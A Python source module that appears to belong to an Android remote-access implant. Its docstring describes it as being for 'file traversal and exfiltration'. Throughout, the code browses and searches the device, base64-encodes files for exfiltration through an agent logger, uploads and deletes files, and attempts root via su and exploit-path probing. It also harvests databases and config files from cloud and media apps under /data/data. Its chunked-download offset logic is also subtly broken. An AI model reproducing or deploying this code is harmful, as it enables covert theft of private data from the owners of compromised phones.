
"""
Filesystem operations module for file traversal and exfiltration
"""
import base64
import hashlib
import os
import shutil
import time
import subprocess
import json
from pathlib import Path
from typing import Dict, Any, List, Optional

class FilesystemModule:
    def __init__(self, agent):
        self.agent = agent
        self.download_queue = []
        self.max_file_size = 50 * 1024 * 1024
        
    def execute(self, command: str, args: Dict[str, Any]) -> Dict[str, Any]:
        """Execute filesystem commands"""
        try:
            if command == "ls":
                return self.list_directory(args)
            elif command == "download":
                return self.download_file(args)
            elif command == "upload":
                return self.upload_file(args)
            elif command == "rm":
                return self.remove_file(args)
            elif command == "find":
                return self.find_files(args)
            elif command == "get_queue":
                return self.get_download_queue()
            elif command == "clear_queue":
                return self.clear_download_queue()
            elif command == "elevate_permissions":
                return self.elevate_permissions(args)
            elif command == "browse_with_elevation":
                return self.browse_with_elevation(args)
            elif command == "resume_download":
                return self.resume_download(args)
            elif command == "scan_sd_cards":
                return self.scan_sd_cards(args)
            elif command == "access_external_storage":
                return self.access_external_storage(args)
            elif command == "scan_cloud_storage":
                return self.scan_cloud_storage(args)
            elif command == "extract_cloud_data":
                return self.extract_cloud_data(args)
            else:
                return {"error": f"Unknown filesystem command: {command}"}
                
        except Exception as e:
            return {"error": f"Filesystem operation failed: {str(e)}"}
    
    def list_directory(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """List directory contents"""
        try:
            path = args.get("path", "/sdcard")
            show_hidden = args.get("show_hidden", False)
            
            target_path = Path(path)
            
            if not target_path.exists():
                return {"error": f"Path does not exist: {path}"}
            
            if not target_path.is_dir():
                return {"error": f"Path is not a directory: {path}"}
            
            entries = []
            
            try:
                for item in target_path.iterdir():

                    if not show_hidden and item.name.startswith('.'):
                        continue
                    
                    try:
                        stat = item.stat()
                        entry = {
                            "name": item.name,
                            "path": str(item),
                            "type": "directory" if item.is_dir() else "file",
                            "size": stat.st_size if item.is_file() else 0,
                            "modified": stat.st_mtime,
                            "permissions": oct(stat.st_mode)[-3:]
                        }
                        entries.append(entry)
                        
                    except (OSError, PermissionError) as e:
                        entries.append({
                            "name": item.name,
                            "path": str(item),
                            "type": "unknown",
                            "error": str(e)
                        })
                        
            except PermissionError:
                return {"error": f"Permission denied: {path}"}
            
            return {
                "success": True,
                "path": str(target_path),
                "entries": sorted(entries, key=lambda x: (x["type"], x["name"])),
                "total": len(entries)
            }
            
        except Exception as e:
            return {"error": f"Directory listing failed: {str(e)}"}
    
    def download_file(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Download/exfiltrate file"""
        try:
            file_path = args.get("file_path")
            chunk_download = args.get("chunk", False)
            
            if not file_path:
                return {"error": "file_path required"}
            
            target_file = Path(file_path)
            
            if not target_file.exists():
                return {"error": f"File does not exist: {file_path}"}
            
            if not target_file.is_file():
                return {"error": f"Path is not a file: {file_path}"}
            
            try:
                file_size = target_file.stat().st_size
                
                if file_size > self.max_file_size and not chunk_download:
                    return {
                        "error": f"File too large ({file_size} bytes). Use chunk=true for large files."
                    }
                

                with open(target_file, 'rb') as f:
                    file_data = f.read()
                
                file_hash = hashlib.sha256(file_data).hexdigest()
                encoded_data = base64.b64encode(file_data).decode()
                

                artifact_id = self.agent.offline_logger.log_artifact(
                    "file_download",
                    file_data,
                    {
                        "file_path": file_path,
                        "file_name": target_file.name,
                        "file_size": file_size,
                        "sha256": file_hash,
                        "downloaded_at": time.time()
                    }
                )
                
                return {
                    "success": True,
                    "file_path": file_path,
                    "file_name": target_file.name,
                    "size": file_size,
                    "sha256": file_hash,
                    "artifact_id": artifact_id,
                    "data": encoded_data if file_size <= 1024*1024 else None,
                    "message": f"File downloaded: {target_file.name}"
                }
                
            except PermissionError:
                return {"error": f"Permission denied: {file_path}"}
                
        except Exception as e:
            return {"error": f"File download failed: {str(e)}"}
    
    def upload_file(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Upload file to device"""
        try:
            target_path = args.get("target_path")
            file_data = args.get("file_data")
            overwrite = args.get("overwrite", False)
            
            if not target_path or not file_data:
                return {"error": "target_path and file_data required"}
            
            target_file = Path(target_path)
            
            if target_file.exists() and not overwrite:
                return {"error": f"File exists and overwrite=false: {target_path}"}
            

            try:
                decoded_data = base64.b64decode(file_data)
            except Exception as e:
                return {"error": f"Invalid base64 data: {str(e)}"}
            

            target_file.parent.mkdir(parents=True, exist_ok=True)
            

            with open(target_file, 'wb') as f:
                f.write(decoded_data)
            
            file_size = len(decoded_data)
            file_hash = hashlib.sha256(decoded_data).hexdigest()
            

            self.agent.offline_logger.log_event("file_uploaded", {
                "target_path": target_path,
                "file_size": file_size,
                "sha256": file_hash,
                "uploaded_at": time.time()
            })
            
            return {
                "success": True,
                "target_path": target_path,
                "size": file_size,
                "sha256": file_hash,
                "message": f"File uploaded: {target_file.name}"
            }
            
        except Exception as e:
            return {"error": f"File upload failed: {str(e)}"}
    
    def remove_file(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Remove file or directory"""
        try:
            target_path = args.get("target_path")
            recursive = args.get("recursive", False)
            
            if not target_path:
                return {"error": "target_path required"}
            
            target = Path(target_path)
            
            if not target.exists():
                return {"error": f"Path does not exist: {target_path}"}
            
            if target.is_file():
                target.unlink()
                operation = "file removed"
            elif target.is_dir():
                if recursive:
                    shutil.rmtree(target)
                    operation = "directory removed (recursive)"
                else:
                    target.rmdir()
                    operation = "directory removed"
            else:
                return {"error": f"Unknown path type: {target_path}"}
            

            self.agent.offline_logger.log_event("file_removed", {
                "target_path": target_path,
                "operation": operation,
                "removed_at": time.time()
            })
            
            return {
                "success": True,
                "target_path": target_path,
                "operation": operation,
                "message": f"Successfully {operation}: {target.name}"
            }
            
        except PermissionError:
            return {"error": f"Permission denied: {target_path}"}
        except OSError as e:
            return {"error": f"OS error: {str(e)}"}
        except Exception as e:
            return {"error": f"Remove failed: {str(e)}"}
    
    def find_files(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Find files matching criteria"""
        try:
            search_path = args.get("path", "/sdcard")
            pattern = args.get("pattern", "*")
            file_type = args.get("type")
            max_results = args.get("max_results", 100)
            
            search_root = Path(search_path)
            
            if not search_root.exists():
                return {"error": f"Search path does not exist: {search_path}"}
            
            matches = []
            
            try:

                if file_type == "file":
                    iterator = search_root.rglob(pattern)
                    iterator = (p for p in iterator if p.is_file())
                elif file_type == "dir":
                    iterator = search_root.rglob(pattern)
                    iterator = (p for p in iterator if p.is_dir())
                else:
                    iterator = search_root.rglob(pattern)
                
                count = 0
                for match in iterator:
                    if count >= max_results:
                        break
                    
                    try:
                        stat = match.stat()
                        matches.append({
                            "path": str(match),
                            "name": match.name,
                            "type": "directory" if match.is_dir() else "file",
                            "size": stat.st_size if match.is_file() else 0,
                            "modified": stat.st_mtime
                        })
                        count += 1
                        
                    except (OSError, PermissionError):
                        continue
                        
            except PermissionError:
                return {"error": f"Permission denied searching: {search_path}"}
            
            return {
                "success": True,
                "search_path": search_path,
                "pattern": pattern,
                "matches": matches,
                "total_found": len(matches),
                "truncated": len(matches) >= max_results
            }
            
        except Exception as e:
            return {"error": f"File search failed: {str(e)}"}
    
    def get_download_queue(self) -> Dict[str, Any]:
        """Get current download queue"""
        return {
            "success": True,
            "queue": self.download_queue,
            "count": len(self.download_queue)
        }
    
    def clear_download_queue(self) -> Dict[str, Any]:
        """Clear download queue"""
        cleared_count = len(self.download_queue)
        self.download_queue.clear()
        
        return {
            "success": True,
            "cleared_count": cleared_count,
            "message": f"Cleared {cleared_count} items from download queue"
        }
    
    def elevate_permissions(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt to elevate permissions using various methods"""
        try:
            method = args.get("method", "auto")
            
            elevation_methods = []
            
            if method == "auto" or method == "su":

                su_result = self._try_su_elevation()
                elevation_methods.append(su_result)
            
            if method == "auto" or method == "exploit":

                exploit_result = self._try_exploit_elevation()
                elevation_methods.append(exploit_result)
            

            current_perms = self._check_current_permissions()
            
            return {
                "success": True,
                "current_permissions": current_perms,
                "elevation_attempts": elevation_methods,
                "message": "Permission elevation attempted"
            }
            
        except Exception as e:
            return {"error": f"Permission elevation failed: {str(e)}"}
    
    def _try_su_elevation(self) -> Dict[str, Any]:
        """Try to obtain root access via su"""
        try:
            cmd = ["su", "-c", "id"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0 and "uid=0" in result.stdout:
                return {
                    "method": "su",
                    "success": True,
                    "output": result.stdout.strip()
                }
            else:
                return {
                    "method": "su",
                    "success": False,
                    "error": result.stderr or "su access denied"
                }
        except subprocess.TimeoutExpired:
            return {"method": "su", "success": False, "error": "su timeout"}
        except Exception as e:
            return {"method": "su", "success": False, "error": str(e)}
    
    def _try_exploit_elevation(self) -> Dict[str, Any]:
        """Try known Android privilege escalation exploits"""
        try:

            exploitable_paths = [
                "/system/xbin/su",
                "/system/bin/su",
                "/system/app/Superuser.apk",
                "/data/local/tmp"
            ]
            
            available_exploits = []
            for path in exploitable_paths:
                if os.path.exists(path):
                    available_exploits.append(path)
            

            try:
                test_file = "/data/local/tmp/test_elevation"
                with open(test_file, 'w') as f:
                    f.write("test")
                os.remove(test_file)
                temp_writable = True
            except:
                temp_writable = False
            
            return {
                "method": "exploit",
                "success": len(available_exploits) > 0 or temp_writable,
                "available_exploits": available_exploits,
                "temp_writable": temp_writable
            }
            
        except Exception as e:
            return {"method": "exploit", "success": False, "error": str(e)}
    
    def _check_current_permissions(self) -> Dict[str, Any]:
        """Check current process permissions"""
        try:
            uid = os.getuid()
            gid = os.getgid()
            

            is_root = uid == 0
            

            readable_paths = []
            writable_paths = []
            
            test_paths = [
                "/sdcard",
                "/data",
                "/system",
                "/data/local/tmp",
                "/data/data"
            ]
            
            for path in test_paths:
                if os.access(path, os.R_OK):
                    readable_paths.append(path)
                if os.access(path, os.W_OK):
                    writable_paths.append(path)
            
            return {
                "uid": uid,
                "gid": gid,
                "is_root": is_root,
                "readable_paths": readable_paths,
                "writable_paths": writable_paths
            }
            
        except Exception as e:
            return {"error": str(e)}
    
    def browse_with_elevation(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Browse filesystem with elevated permissions"""
        try:
            path = args.get("path", "/")
            use_su = args.get("use_su", True)
            
            if use_su:

                cmd = ["su", "-c", f"ls -la '{path}'"]
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    entries = self._parse_ls_output(result.stdout, path)
                    return {
                        "success": True,
                        "path": path,
                        "entries": entries,
                        "method": "su",
                        "total": len(entries)
                    }
                else:
                    return {"error": f"su command failed: {result.stderr}"}
            else:

                return self.list_directory({"path": path})
                
        except Exception as e:
            return {"error": f"Elevated browsing failed: {str(e)}"}
    
    def _parse_ls_output(self, output: str, base_path: str) -> List[Dict[str, Any]]:
        """Parse ls -la output into structured entries"""
        entries = []
        lines = output.strip().split('\n')
        
        for line in lines:
            if not line or line.startswith('total'):
                continue
                
            parts = line.split()
            if len(parts) >= 9:
                permissions = parts[0]
                size = parts[4] if parts[4].isdigit() else 0
                name = ' '.join(parts[8:])
                

                if name in ['.', '..']:
                    continue
                
                entry = {
                    "name": name,
                    "path": os.path.join(base_path, name),
                    "permissions": permissions,
                    "size": int(size) if isinstance(size, str) and size.isdigit() else size,
                    "type": "directory" if permissions.startswith('d') else "file"
                }
                entries.append(entry)
        
        return entries
    
    def resume_download(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Resume a previously interrupted download"""
        try:
            file_path = args.get("file_path")
            resume_offset = args.get("resume_offset", 0)
            chunk_size = args.get("chunk_size", 1024*1024)
            
            if not file_path:
                return {"error": "file_path required"}
            
            target_file = Path(file_path)
            if not target_file.exists():
                return {"error": f"File does not exist: {file_path}"}
            
            file_size = target_file.stat().st_size
            
            if resume_offset >= file_size:
                return {"error": "Resume offset is beyond file size"}
            

            remaining_size = file_size - resume_offset
            chunks_downloaded = 0
            total_chunks = (remaining_size + chunk_size - 1) // chunk_size
            
            with open(target_file, 'rb') as f:
                f.seek(resume_offset)
                
                chunk_data = []
                while remaining_size > 0:
                    current_chunk_size = min(chunk_size, remaining_size)
                    chunk = f.read(current_chunk_size)
                    
                    if not chunk:
                        break
                    
                    chunk_encoded = base64.b64encode(chunk).decode()
                    chunk_data.append({
                        "offset": resume_offset + len(b''.join([base64.b64decode(c) for c in chunk_data[:-1]])),
                        "size": len(chunk),
                        "data": chunk_encoded
                    })
                    
                    remaining_size -= len(chunk)
                    chunks_downloaded += 1
                    

                    if chunks_downloaded >= 10:
                        break
            

            downloaded_data = b''.join([base64.b64decode(c["data"]) for c in chunk_data])
            chunk_hash = hashlib.sha256(downloaded_data).hexdigest()
            

            artifact_id = self.agent.offline_logger.log_artifact(
                "resume_download",
                downloaded_data,
                {
                    "file_path": file_path,
                    "resume_offset": resume_offset,
                    "chunk_count": len(chunk_data),
                    "downloaded_size": len(downloaded_data),
                    "sha256": chunk_hash,
                    "downloaded_at": time.time()
                }
            )
            
            return {
                "success": True,
                "file_path": file_path,
                "resume_offset": resume_offset,
                "chunks": chunk_data,
                "total_chunks": total_chunks,
                "downloaded_chunks": len(chunk_data),
                "remaining_size": remaining_size,
                "artifact_id": artifact_id,
                "complete": remaining_size == 0
            }
            
        except Exception as e:
            return {"error": f"Resume download failed: {str(e)}"}
    
    def scan_sd_cards(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Scan for SD cards and external storage"""
        try:

            potential_mounts = [
                "/sdcard",
                "/storage/emulated/0",
                "/storage/sdcard0",
                "/storage/sdcard1",
                "/storage/extSdCard",
                "/storage/external_SD",
                "/mnt/sdcard",
                "/mnt/external_sd",
                "/mnt/extsd"
            ]
            

            mount_info = self._get_mount_info()
            
            detected_storage = []
            
            for mount_point in potential_mounts:
                if os.path.exists(mount_point) and os.path.ismount(mount_point):
                    storage_info = self._analyze_storage_device(mount_point)
                    detected_storage.append(storage_info)
            

            proc_mounts = self._parse_proc_mounts()
            for mount in proc_mounts:
                if self._is_external_storage(mount):
                    storage_info = self._analyze_storage_device(mount["mount_point"])

                    if not any(s["mount_point"] == storage_info["mount_point"] for s in detected_storage):
                        detected_storage.append(storage_info)
            
            return {
                "success": True,
                "detected_storage": detected_storage,
                "mount_info": mount_info,
                "total_devices": len(detected_storage)
            }
            
        except Exception as e:
            return {"error": f"SD card scan failed: {str(e)}"}
    
    def _get_mount_info(self) -> List[Dict[str, Any]]:
        """Get system mount information"""
        try:
            result = subprocess.run(["mount"], capture_output=True, text=True)
            mount_info = []
            
            if result.returncode == 0:
                for line in result.stdout.strip().split('\n'):
                    parts = line.split()
                    if len(parts) >= 3:
                        mount_info.append({
                            "device": parts[0],
                            "mount_point": parts[2],
                            "filesystem": parts[4] if len(parts) > 4 else "unknown",
                            "options": parts[5] if len(parts) > 5 else ""
                        })
            
            return mount_info
        except:
            return []
    
    def _parse_proc_mounts(self) -> List[Dict[str, Any]]:
        """Parse /proc/mounts for mount information"""
        try:
            mounts = []
            with open("/proc/mounts", "r") as f:
                for line in f:
                    parts = line.strip().split()
                    if len(parts) >= 4:
                        mounts.append({
                            "device": parts[0],
                            "mount_point": parts[1],
                            "filesystem": parts[2],
                            "options": parts[3]
                        })
            return mounts
        except:
            return []
    
    def _is_external_storage(self, mount: Dict[str, Any]) -> bool:
        """Check if a mount point is external storage"""
        mount_point = mount["mount_point"]
        filesystem = mount["filesystem"]
        

        external_indicators = [
            "/storage/",
            "/mnt/media_rw/",
            "/mnt/runtime/write/",
            "sdcard",
            "extsd",
            "external"
        ]
        

        external_fs = ["vfat", "exfat", "ntfs", "ext4"]
        
        return (any(indicator in mount_point.lower() for indicator in external_indicators) and
                filesystem in external_fs)
    
    def _analyze_storage_device(self, mount_point: str) -> Dict[str, Any]:
        """Analyze a storage device at given mount point"""
        try:

            stat = os.statvfs(mount_point)
            total_size = stat.f_frsize * stat.f_blocks
            available_size = stat.f_frsize * stat.f_available
            used_size = total_size - available_size
            

            file_count = 0
            dir_count = 0
            
            try:
                for root, dirs, files in os.walk(mount_point):
                    file_count += len(files)
                    dir_count += len(dirs)

                    if file_count + dir_count > 10000:
                        break
            except (PermissionError, OSError):
                pass
            
            return {
                "mount_point": mount_point,
                "total_size": total_size,
                "available_size": available_size,
                "used_size": used_size,
                "file_count": file_count,
                "directory_count": dir_count,
                "accessible": os.access(mount_point, os.R_OK)
            }
            
        except Exception as e:
            return {
                "mount_point": mount_point,
                "error": str(e),
                "accessible": False
            }
    
    def access_external_storage(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Access external storage devices"""
        try:
            mount_point = args.get("mount_point")
            operation = args.get("operation", "list")
            
            if not mount_point:
                return {"error": "mount_point required"}
            
            if not os.path.exists(mount_point):
                return {"error": f"Mount point does not exist: {mount_point}"}
            
            if operation == "list":
                return self.list_directory({"path": mount_point})
            elif operation == "search":
                pattern = args.get("pattern", "*")
                return self.find_files({
                    "path": mount_point,
                    "pattern": pattern,
                    "max_results": args.get("max_results", 100)
                })
            elif operation == "download":
                file_path = args.get("file_path")
                if not file_path:
                    return {"error": "file_path required for download operation"}
                return self.download_file({"file_path": file_path})
            else:
                return {"error": f"Unknown operation: {operation}"}
                
        except Exception as e:
            return {"error": f"External storage access failed: {str(e)}"}
    
    def scan_cloud_storage(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Scan for cloud storage applications and data"""
        try:

            cloud_apps = [
                "com.google.android.apps.docs",
                "com.dropbox.android",
                "com.microsoft.skydrive",
                "com.amazon.clouddrive.photos",
                "com.box.android",
                "com.adobe.cc",
                "com.apple.android.music",
                "com.spotify.music",
                "com.netflix.mediaclient"
            ]
            
            detected_apps = []
            
            for package in cloud_apps:
                if self._check_app_installed(package):
                    app_info = self._analyze_cloud_app(package)
                    detected_apps.append(app_info)
            

            cloud_data_dirs = self._scan_cloud_data_directories()
            
            return {
                "success": True,
                "detected_apps": detected_apps,
                "cloud_data_dirs": cloud_data_dirs,
                "total_apps": len(detected_apps)
            }
            
        except Exception as e:
            return {"error": f"Cloud storage scan failed: {str(e)}"}
    
    def _check_app_installed(self, package_name: str) -> bool:
        """Check if an app package is installed"""
        try:
            cmd = ["pm", "list", "packages", package_name]
            result = subprocess.run(cmd, capture_output=True, text=True)
            return result.returncode == 0 and package_name in result.stdout
        except:
            return False
    
    def _analyze_cloud_app(self, package_name: str) -> Dict[str, Any]:
        """Analyze a cloud storage app"""
        try:
            data_dir = f"/data/data/{package_name}"
            
            app_info = {
                "package_name": package_name,
                "data_dir": data_dir,
                "accessible": os.path.exists(data_dir),
                "files_count": 0,
                "databases": [],
                "config_files": []
            }
            
            if os.path.exists(data_dir) and os.access(data_dir, os.R_OK):

                db_files = []
                config_files = []
                file_count = 0
                
                for root, dirs, files in os.walk(data_dir):
                    for file in files:
                        file_count += 1
                        file_path = os.path.join(root, file)
                        
                        if file.endswith(('.db', '.sqlite', '.sqlite3')):
                            db_files.append(file_path)
                        elif file.endswith(('.xml', '.json', '.conf', '.cfg', '.properties')):
                            config_files.append(file_path)
                
                app_info.update({
                    "files_count": file_count,
                    "databases": db_files,
                    "config_files": config_files
                })
            
            return app_info
            
        except Exception as e:
            return {
                "package_name": package_name,
                "error": str(e)
            }
    
    def _scan_cloud_data_directories(self) -> List[Dict[str, Any]]:
        """Scan common directories for cloud storage data"""
        try:
            cloud_dirs = [
                "/sdcard/Download",
                "/sdcard/Documents",
                "/sdcard/Pictures",
                "/sdcard/DCIM/Cloud",
                "/sdcard/Android/data"
            ]
            
            found_dirs = []
            
            for dir_path in cloud_dirs:
                if os.path.exists(dir_path):
                    try:

                        cloud_indicators = ["drive", "dropbox", "onedrive", "cloud", "sync"]
                        
                        for root, dirs, files in os.walk(dir_path):
                            for dir_name in dirs:
                                if any(indicator in dir_name.lower() for indicator in cloud_indicators):
                                    full_path = os.path.join(root, dir_name)
                                    dir_info = {
                                        "path": full_path,
                                        "type": "cloud_directory",
                                        "accessible": os.access(full_path, os.R_OK)
                                    }
                                    found_dirs.append(dir_info)
                            

                            if len(found_dirs) > 50:
                                break
                                
                    except (PermissionError, OSError):
                        continue
            
            return found_dirs
            
        except Exception:
            return []
    
    def extract_cloud_data(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Extract data from cloud storage applications"""
        try:
            package_name = args.get("package_name")
            data_types = args.get("data_types", ["databases", "config", "cache"])
            
            if not package_name:
                return {"error": "package_name required"}
            
            data_dir = f"/data/data/{package_name}"
            
            if not os.path.exists(data_dir):
                return {"error": f"App data directory not found: {data_dir}"}
            
            extracted_data = {
                "package_name": package_name,
                "extraction_time": time.time(),
                "databases": [],
                "config_files": [],
                "cache_files": [],
                "artifacts": []
            }
            
            try:
                for root, dirs, files in os.walk(data_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        

                        try:
                            file_size = os.path.getsize(file_path)
                            if file_size > 10 * 1024 * 1024:
                                continue
                        except:
                            continue
                        
                        if "databases" in data_types and file.endswith(('.db', '.sqlite', '.sqlite3')):
                            db_data = self._extract_database_info(file_path)
                            extracted_data["databases"].append(db_data)
                        
                        elif "config" in data_types and file.endswith(('.xml', '.json', '.conf', '.properties')):
                            config_data = self._extract_config_file(file_path)
                            extracted_data["config_files"].append(config_data)
                        
                        elif "cache" in data_types and ("cache" in root.lower() or file.endswith('.cache')):
                            cache_info = {
                                "file_path": file_path,
                                "size": file_size,
                                "modified": os.path.getmtime(file_path)
                            }
                            extracted_data["cache_files"].append(cache_info)
            
            except (PermissionError, OSError) as e:
                extracted_data["error"] = f"Access denied: {str(e)}"
            

            if any(extracted_data[key] for key in ["databases", "config_files", "cache_files"]):
                artifact_id = self.agent.offline_logger.log_artifact(
                    "cloud_data_extraction",
                    json.dumps(extracted_data, indent=2).encode(),
                    {
                        "package_name": package_name,
                        "extraction_time": extracted_data["extraction_time"],
                        "data_types": data_types
                    }
                )
                extracted_data["artifact_id"] = artifact_id
            
            return {
                "success": True,
                "extracted_data": extracted_data,
                "message": f"Extracted data from {package_name}"
            }
            
        except Exception as e:
            return {"error": f"Cloud data extraction failed: {str(e)}"}
    
    def _extract_database_info(self, db_path: str) -> Dict[str, Any]:
        """Extract basic information from a database file"""
        try:
            import sqlite3
            
            db_info = {
                "file_path": db_path,
                "size": os.path.getsize(db_path),
                "tables": [],
                "accessible": True
            }
            
            try:
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                

                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                tables = cursor.fetchall()
                
                for table in tables:
                    table_name = table[0]
                    cursor.execute(f"SELECT COUNT(*) FROM {table_name}")
                    row_count = cursor.fetchone()[0]
                    
                    db_info["tables"].append({
                        "name": table_name,
                        "row_count": row_count
                    })
                
                conn.close()
                
            except Exception as e:
                db_info["accessible"] = False
                db_info["error"] = str(e)
            
            return db_info
            
        except Exception as e:
            return {
                "file_path": db_path,
                "error": str(e),
                "accessible": False
            }
    
    def _extract_config_file(self, config_path: str) -> Dict[str, Any]:
        """Extract data from configuration files"""
        try:
            config_info = {
                "file_path": config_path,
                "size": os.path.getsize(config_path),
                "content_preview": "",
                "accessible": True
            }
            
            try:
                with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:

                    content = f.read(1024)
                    config_info["content_preview"] = content
                    

                    if config_path.endswith('.json'):
                        try:
                            f.seek(0)
                            json_data = json.load(f)
                            config_info["json_keys"] = list(json_data.keys()) if isinstance(json_data, dict) else None
                        except:
                            pass
                            
            except Exception as e:
                config_info["accessible"] = False
                config_info["error"] = str(e)
            
            return config_info
            
        except Exception as e:
            return {
                "file_path": config_path,
                "error": str(e),
                "accessible": False
            }
